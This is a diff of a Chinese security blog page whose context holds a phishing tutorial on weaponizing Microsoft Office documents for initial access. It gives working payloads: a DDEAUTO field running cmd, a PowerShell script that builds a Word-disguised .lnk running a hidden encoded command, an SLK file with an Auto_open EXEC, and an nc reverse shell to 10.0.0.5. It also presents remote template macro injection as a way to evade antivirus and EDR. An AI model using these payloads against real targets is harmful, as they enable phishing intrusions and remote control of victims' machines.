@@ -76,7 +76,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(90)</small>
+                <small>(89)</small>
             
         </div>
     </li>
@@ -579,7 +579,7 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="90">
+<input type="hidden" id="yelog_site_posts_number" value="89">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -641,15 +641,6 @@
            data-author="" >
             <span class="post-title" title="对中国整个安全行业的理解">对中国整个安全行业的理解</span>
             <span class="post-date" title="2023-06-14 16:06:36">2023/06/14</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2024/06/20/hello-world/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="Hello World">Hello World</span>
-            <span class="post-date" title="2024-06-20 14:35:01">2024/06/20</span>
         </a>
         
         
@@ -1621,12 +1612,12 @@
 
 <h1 id="使用-MS-Office-进行网络钓鱼"><a href="#使用-MS-Office-进行网络钓鱼" class="headerlink" title="使用 MS Office 进行网络钓鱼"></a>使用 MS Office 进行网络钓鱼</h1><h2 id="网络钓鱼：XLM-宏-4-0"><a href="#网络钓鱼：XLM-宏-4-0" class="headerlink" title="网络钓鱼：XLM&#x2F;宏 4.0"></a>网络钓鱼：XLM&#x2F;宏 4.0</h2><p><a target="_blank" rel="noopener" href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/">https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/</a></p>
 <p>可以通过首先插入“MS Execel 4.0 Macro”类型的新工作表来武器化 Microsoft Excel 电子表格：</p>
-<p><img src="/%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C1.png"></p>
+<p><img src="/.com//%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C1.png"></p>
 <p>Auto_open设置是下次excel自动打开运行的东西</p>
-<p><img src="/%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C2.png"></p>
+<p><img src="/.com//%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C2.png"></p>
 <h2 id="T1173：网络钓鱼-DDE"><a href="#T1173：网络钓鱼-DDE" class="headerlink" title="T1173：网络钓鱼 - DDE"></a>T1173：网络钓鱼 - DDE</h2><p>动态数据交换代码 - 在 Microsoft Office 文档中执行代码。</p>
 <p> 打开一个新的 MS Word 文档并插入一个字段：</p>
-<p><img src="/%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C3.png"></p>
+<p><img src="/.com//%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C3.png"></p>
 <p>替换<code>= \* MERGEFORMAT</code>为有效负载并保存文档：</p>
 <p>DDEAUTO c:\windows\system32\cmd.exe “&#x2F;k calc.exe” </p>
 <p>我们如何检查 .docx（与 .xlsx 相同）文件？由于它们本质上是 .zip 存档，因此我们可以将 .docx 文件重命名为 .zip，然后简单地解压缩存档以进行进一步检查。</p>
@@ -1645,7 +1636,7 @@
 <p>root@remnux:&#x2F;home&#x2F;remnux# hexdump -C Doc3.dotm | head -n1</p>
 <p>00000000  50 4b 03 04 14 00 06 00  08 00 00 00 21 00 cc 3c  |PK……….!..&lt;|</p>
 <p>…文件 Dot3.dotm 可以重命名为<strong>Doc3.zip</strong> ，并像常规 ZIP 存档一样简单地解压缩。这样做会缩小存档并暴露构成恶意 Office 文档的文件。其中一个文件是<code>document.xml</code>主要文档正文文本所在的位置，并且<code>vbaProject.bin</code>包含邪恶的宏本身：</p>
-<p>查看内部，我们可以看到我们在<code>document.xml</code><a href="">武器化</a>部分的本页开头输入的正文副本：</p>
+<p>查看内部，我们可以看到我们在<code>document.xml</code><a href>武器化</a>部分的本页开头输入的正文副本：</p>
 <h2 id="钓鱼OLE-LNK"><a href="#钓鱼OLE-LNK" class="headerlink" title="钓鱼OLE + LNK"></a>钓鱼OLE + LNK</h2><p>本实验室探讨了一种流行的网络钓鱼技术，攻击者将 .lnk 文件嵌入到 Office 文档中，并使用 Ms Word Office 图标进行伪装，以欺骗受害者单击并运行它们。</p>
 <p>创建一个 .LNK 文件，该文件在执行后将触发有效负载：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$command = &#x27;Start-Process c:\shell.cmd&#x27;</span><br><span class="line">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)</span><br><span class="line">$encodedCommand = [Convert]::ToBase64String($bytes)</span><br><span class="line"></span><br><span class="line">$obj = New-object -comobject wscript.shell</span><br><span class="line">$link = $obj.createshortcut(&quot;c:\experiments\ole+lnk\Invoice-FinTech-0900541.lnk&quot;)</span><br><span class="line">$link.windowstyle = &quot;7&quot;</span><br><span class="line">$link.targetpath = &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span><br><span class="line">$link.iconlocation = &quot;C:\Program Files\Windows NT\Accessories\wordpad.exe&quot;</span><br><span class="line">$link.arguments = &quot;-Nop -sta -noni -w hidden -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHMAaABlAGwAbAAuAGMAbQBkAA==&quot;</span><br><span class="line">$link.save()</span><br></pre></td></tr></table></figure>
@@ -1655,15 +1646,15 @@
 
 <p>执行上述 powershell 脚本后，<code>.LNK</code>将创建一个快捷方式：</p>
 <p>让我们创建一个 Word 文档，其中将包含上一步中创建的恶意快捷方式：</p>
-<p><img src="/%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C4.png"></p>
+<p><img src="/.com//%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C4.png"></p>
 <p>让我们创建一个 Word 文档，其中将包含上一步中创建的恶意快捷方式：</p>
 <p>让我们通过选择一个并将其图标源更改为 Microsoft Word 可执行文件来将新对象插入到文档中：<code>Package</code></p>
-<p><img src="/%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C5.png"></p>
+<p><img src="/.com//%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C5.png"></p>
 <h2 id="网络钓鱼：嵌入式-Internet-Explorer"><a href="#网络钓鱼：嵌入式-Internet-Explorer" class="headerlink" title="网络钓鱼：嵌入式 Internet Explorer"></a>网络钓鱼：嵌入式 Internet Explorer</h2><p><a target="_blank" rel="noopener" href="https://www.securify.nl/blog/click-me-if-you-can-office-social-engineering-with-embedded-objects/">https://www.securify.nl/blog/click-me-if-you-can-office-social-engineering-with-embedded-objects/</a></p>
 <h2 id="网络钓鱼：-SLK-Excel"><a href="#网络钓鱼：-SLK-Excel" class="headerlink" title="网络钓鱼：.SLK Excel"></a>网络钓鱼：.SLK Excel</h2><p>创建一个新的文本文件，放入以下代码并将其另存为 .slk 文件：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID;P</span><br><span class="line">O;E</span><br><span class="line">NN;NAuto_open;ER101C1;KOut Flank;F</span><br><span class="line">C;X1;Y101;K0;EEXEC(&quot;c:\shell.cmd&quot;)</span><br><span class="line">C;X1;Y102;K0;EHALT()</span><br><span class="line">E</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C6.png"></p>
+<p><img src="/.com//%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C6.png"></p>
 <p>请注意，shell.cmd 指的是一个简单的 nc 反向 shell 批处理文件：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c:\shell.cmd</span><br><span class="line"></span><br><span class="line">C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe</span><br></pre></td></tr></table></figure>
 
@@ -1673,7 +1664,7 @@
 <p>将 .docx 重命名为 .zip：</p>
 <p>在任何代码编辑器中打开：<code>document.xml</code></p>
 <p>请注意该<code>embeddedHtml</code>属性 - 这是当前嵌入 YouTube iframe 的位置：</p>
-<p><img src="/%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C7.png"></p>
+<p><img src="/.com//%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%5C7.png"></p>
 <p>接下来，我们将在 iframe 标记开始之前将有效负载添加到属性内。<code>embeddedHtml</code>我们将使用本文中的有效负载：</p>
 <h2 id="从远程-Dotm-模板注入宏"><a href="#从远程-Dotm-模板注入宏" class="headerlink" title="从远程 Dotm 模板注入宏"></a>从远程 Dotm 模板注入宏</h2><p>本实验展示了如何间接将宏有效负载添加到 docx 文件中，这很有可能逃避某些 AV&#x2F;EDR。</p>
 <p>该技术的工作原理如下：</p>
@@ -1687,7 +1678,7 @@
 <p>将之前创建的模板上传<code>Doc3.dot</code>到 SMB 服务器（请注意，该文件也可以托管在 Web 服务器上！）。</p>
 <p>更新 word_rels\settings.xml.rels 以指向 Doc3.dotm：</p>
 <p>压缩所有存档文件<code>legit</code>并将其重新命名为 .docx - 我们现在有了一个武器化文档：</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+<h2 id><a href="#" class="headerlink" title></a></h2>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
     </div>
